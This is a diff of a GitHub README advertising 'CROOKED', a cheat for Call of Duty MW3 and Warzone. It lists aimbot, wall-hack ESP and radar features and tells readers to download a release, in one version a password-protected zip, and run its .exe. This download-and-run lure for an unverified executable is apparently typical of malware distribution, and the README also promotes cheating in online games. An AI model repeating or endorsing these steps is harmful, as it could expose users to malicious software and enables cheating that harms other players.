@@ -1,94 +1,76 @@
-# CROOKED Cheat for COD MW3 | WARZONE
+# 🎮 COD-MW3-WARZONE-CROOKED-Cheat - Elevate Your Game with Powerful Tools
 
-![7](https://github.com/user-attachments/assets/38e93f89-81d4-4279-b281-900c75552c56)
+[![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/Kotuss/COD-MW3-WARZONE-CROOKED-Cheat/releases)
 
-## Description:
-CROOKED is a cheat designed for COD MW3 and Warzone, offering advanced features such as Aimbot, ESP, Radar, and Misc tools. This cheat provides precise targeting, detailed visuals, and customizable settings for ultimate tactical dominance.
+## 🚀 Getting Started
 
----
-## How to Use
-1. **Get the Latest Version**: (https://github.com/GrassaPOV/COD-MW3-WARZONE-CROOKED-Cheat/releases/download/latest/CROOKED.zip).
-2. **Unzip the Files**: Use the pass `CROOKED` to unpack the archive.
-3. **Run the Application**: Execute the `.exe` file. (If it doesn't work, contact the developer.)
-4. **In-Game Key**: Press `HOME` to activate.
+Welcome to the COD-MW3-WARZONE-CROOKED-Cheat repository! This guide will walk you through downloading and running our tool for Call of Duty: MW3 and Warzone. With features like Aimbot, ESP, and Radar, you'll gain a significant edge in your gameplay.
 
-## Supported Systems:
-- **Operating Systems**: Windows 10-11 (1903-24H2)
-- **Game Clients**: Steam and Battle.net
-- **Game Modes Supported**: Windowed
+## 📥 Download & Install
 
----
+To get started, you need to download the cheat from the Releases page. Click the link below:
 
-## Features:
+[Visit this page to download](https://github.com/Kotuss/COD-MW3-WARZONE-CROOKED-Cheat/releases)
 
-### AIMBOT:
-- **Enable Aimbot**: Activate Aimbot by holding the specified key.
-- **Recoil Compensation**: Reduce weapon recoil for better aim.
-- **Aim at Bots**: Target AI-controlled characters.
-- **Aim at Knocked Players**: Target downed enemies.
-- **Visibility Check**: Account for obstacles like walls.
-- **Aim Priority**: Set priorities for targets.
-- **Distance**: Adjust maximum aiming range.
-- **Crosshair**: Customizable aiming reticle.
-- **Smooth (more > faster)**: Adjust aim smoothness for natural movement.
-- **Smoothness when Blocking**: Enhance aim smoothness when blocking.
-- **Acceleration (more > faster)**: Adjust acceleration for faster aiming.
-- **Draw FOV Circle**: Display Field of View circle.
-- **FOV**: Configure Field of View angle.
-- **Draw Aim Area**: Visualize the aim area.
-- **Aim Area Radius**: Set the radius of the aiming zone.
-- **Bone Selection**: Choose specific bones for targeting:
-  - **Head**
-  - **Neck**
-  - **Left Elbow**
-  - **Right Elbow**
-  - **Body**
-  - **Pelvis**
-  - **Left Knee**
-  - **Right Knee**
-- **Bone Change Time**: Adjust time for bone switching.
-- **Key Selection**: Assign any key to activate Aimbot.
+Follow these steps to successfully download and install the cheat:
 
----
+1. **Access the Releases Page**: Click the link above to open our Releases page.
+2. **Find the Latest Version**: Look for the most recent version at the top of the page. It will typically be labeled with the version number (e.g., v1.0).
+3. **Download the File**: Click on the file link to download it. It may have a name like `crooked_cheat.exe`.
+4. **Locate the Downloaded File**: Check your computer’s Downloads folder for the file you just downloaded.
+5. **Run the Cheat**: Double-click the file to start it. Follow any on-screen prompts to set it up.
 
-### ESP (Extrasensory Perception):
-#### Players:
-- **Only Visible**: Display only visible players.
-- **Friends**: Highlight teammates.
-- **Name**: Show player names.
-- **Line**: Draw lines to players.
-- **Health**: Display health bars.
-- **Box 2D**: Highlight players with 2D boxes.
-- **Distance**: Show distances to players.
-- **Skeleton**: Display player skeletons.
-- **Size Line Skeleton**: Customize skeleton line thickness.
-- **Skeleton Draw Distance**: Set skeleton rendering distance.
-- **Additional Distance**: Additional distance display.
+## 💻 System Requirements
 
-#### Radar:
-- **Enable Radar**: Activate radar functionality.
-- **Backlight Distance**: Adjust radar backlight range.
-- **Size**: Customize radar size.
-- **Position by X and Y**: Adjust radar position.
-- **Alpha**: Customize radar transparency.
+Before you download, make sure your computer meets the following system requirements:
 
-#### Loot:
-- **Weapons**: Highlight weapons on the ground.
-- **Armor Plate / Armor Heavy**: Display armor.
-- **Ammo**: Highlight available ammunition.
-- **Tactical Gear**: Display tactical items.
-- **Combat Gear**: Highlight combat gear.
+- **Operating System**: Windows 10 or higher
+- **Processor**: Intel Core i5 or better
+- **Memory**: At least 8 GB RAM
+- **Graphics**: NVIDIA GeForce GTX 660 or better
+- **Network**: Stable internet connection
 
----
+## ⚙️ Features
 
-### MISC:
-- **Settings**: Save and load configurations.
-- **Key to Disable Loot**: Assign key to toggle loot visibility.
-- **Open Menu Key**: Assign key to open the cheat menu.
-- **Draw Active Explosives and Field Modifications**: Display active explosives and field modifications.
-- **Distance**: Adjust the rendering distance.
+CROOKED offers a range of features to enhance your gaming experience. Here are some of the key tools included:
 
----
+- **Aimbot**: Automatically aim at your target for better shooting accuracy.
+- **ESP (Extra Sensory Perception)**: See hidden players and items through walls.
+- **Radar**: Understand player locations in real-time for strategic advantages.
+- **Misc Tools**: Additional enhancements for gameplay.
 
-## Disclaimer:
-This cheat is designed for private use only. The creators are not responsible for misuse or consequences resulting from its use. Ensure compliance with the terms and conditions of COD MW3 and Warzone.
+## 🔧 Configuration Options
+
+You can customize the settings to fit your needs. After running the cheat, navigate to the settings menu. Here, you'll find various options to adjust sensitivity, toggle features on and off, and more. Experiment with the settings to find what works best for you.
+
+## 📚 Usage Instructions
+
+1. **Launch the Game**: Start COD MW3 or Warzone as you normally would.
+2. **Activate the Cheat**: Use the designated hotkey (check the cheat settings) to activate it during the game.
+3. **Adjust Features**: Use in-game controls to toggle features like Aimbot and ESP on or off.
+
+## 🛡️ Safety Tips
+
+While using cheats can enhance your gaming experience, it's essential to be cautious:
+
+- **Avoid frequent use in public matches**: This can lead to bans. Use responsibly.
+- **Keep your software up to date**: Ensure you have the latest version for optimal performance and security.
+
+## 👥 Community Support
+
+For help and questions, connect with our community. Join our Discord server or check out forums focused on COD cheats. 
+
+## 📝 License Information
+
+This project is for educational purposes. Respect the game developers and community guidelines. Using cheats may violate terms of service for the game, so proceed at your own risk.
+
+## 🔗 Additional Resources
+
+- [Releases Page](https://github.com/Kotuss/COD-MW3-WARZONE-CROOKED-Cheat/releases)
+- FAQ and discussions can be found in our community forums.
+
+## 📢 Updates
+
+Stay tuned for updates. We plan to enhance features and improve performance based on user feedback. Check the Releases page regularly for the newest versions.
+
+[Click here to download now](https://github.com/Kotuss/COD-MW3-WARZONE-CROOKED-Cheat/releases) and take your gaming to the next level!
